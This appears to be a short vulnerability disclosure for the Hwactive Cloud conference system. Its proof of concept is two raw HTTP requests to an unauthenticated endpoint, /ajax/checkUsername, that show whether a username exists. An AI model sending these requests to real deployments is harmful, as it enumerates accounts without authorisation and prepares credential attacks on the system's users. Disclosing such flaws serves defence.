# Hwactive Cloud conference system Information disclosure vulnerability
Hwactive Cloud conference system has an Information disclosure vulnerability.Unauthorized users can obtain system user information through the vulnerability interface.

## Sphere of influence
Hwactive Cloud conference system<3.0.2

## POC

```
POST /ajax/checkUsername HTTP/1.1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15
Accept-Encoding: gzip, deflate, br
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cache-Control: no-cache
Pragma: no-cache
Host: 127.0.0.1
Content-Length: 27
Connection: close

userName=admin
```
If the user exist, the return value is "true"
![image](https://github.com/user-attachments/assets/2744eae4-2d1f-4a17-985c-92d1da28d10c)

```
POST /ajax/checkUsername HTTP/1.1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15
Accept-Encoding: gzip, deflate, br
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cache-Control: no-cache
Pragma: no-cache
Host: 127.0.0.1
Content-Length: 19
Connection: close

userName=testiojand
```
If the user does not exist, the return value is "false"
![image](https://github.com/user-attachments/assets/9d02c452-3b3d-416f-bb4a-c0eefce260f6)
